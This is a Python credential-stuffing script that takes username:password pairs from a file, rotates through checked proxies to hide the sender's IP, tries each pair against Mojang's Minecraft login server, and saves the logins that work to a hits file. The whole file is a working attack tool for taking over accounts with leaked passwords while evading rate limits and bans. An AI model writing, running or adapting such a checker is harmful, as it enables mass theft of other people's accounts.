import json
import logging
import requests
import colorama

colorama.init()

def init():
	LOG_FORMAT = "[%(asctime)s] %(levelname)s: %(message)s"
	logging.basicConfig(level=logging.INFO, format=LOG_FORMAT, datefmt="%H:%M:%S")
	log = logging.getLogger(__name__)

	return log

def check_proxy(proxy):
	url = "https://api.ipify.org/?format=json"
	proxy_data = {
		'http': proxy,
		'https': proxy
	}

	try:
		resp_with = requests.get(url, proxies=proxy_data, timeout=5)
		resp_none = requests.get(url)
	except KeyboardInterrupt:
		quit()
	except:
		log.error(f"{proxy} | {colorama.Fore.RED}Proxy is down. {colorama.Style.RESET_ALL}")
		return

	json_none = json.loads(resp_none.text)
	json_with = json.loads(resp_with.text)

	if json_none['ip'] == json_with['ip']:
		log.error(f"{proxy} | {colorama.Fore.RED}Bad proxy; IPs match. {colorama.Style.RESET_ALL}")
		return
	else:
		log.info(f"{proxy} | {colorama.Fore.GREEN}Proxy works. Time: {resp_with.elapsed.total_seconds()}s {colorama.Style.RESET_ALL}")
		return proxy

def get_proxy(index):
	file = open('proxies.txt', 'r')
	proxy_list = file.read().split("\n")
	file.close()

	proxy = None

	while not proxy:
		proxy_chosen = proxy_list[index]
		proxy = check_proxy(proxy_chosen)
		index += 1

	return proxy, index

def login(username, password, proxy):
	url = "https://authserver.mojang.com/authenticate"
	payload = {
		"agent": {
			"name": "Minecraft",
			"version": 1
		},
		"username": username,
		"password": password
	}

	try:
		resp = requests.post(url, json=payload, headers={"Content-Type": "application/json"}, proxies=proxy)
	except:
		log.error("An error has occured whilst POSTing to Minecraft. This could be due to poor proxies.")
		return

	if resp.status_code == 403:
		log.error("Account information is wrong (or you're shadowbanned).")

	json_data = json.loads(resp.text)

	if "selectedProfile" in json_data:
		log.info(f"{username}:{password} was {colorama.Fore.GREEN}successfully{colorama.Style.RESET_ALL} received into.")
		return True

if __name__ == "__main__":
	log = init()
	index = 0

	for user in open('users.txt', 'r').read().split('\n'):
		user_data = user.split(':')
		proxy, index = get_proxy(index)
		if login(user_data[0], user_data[1], proxy):
			file = open('hits.txt', 'a')
			file.write(user + "\n")
			file.close()
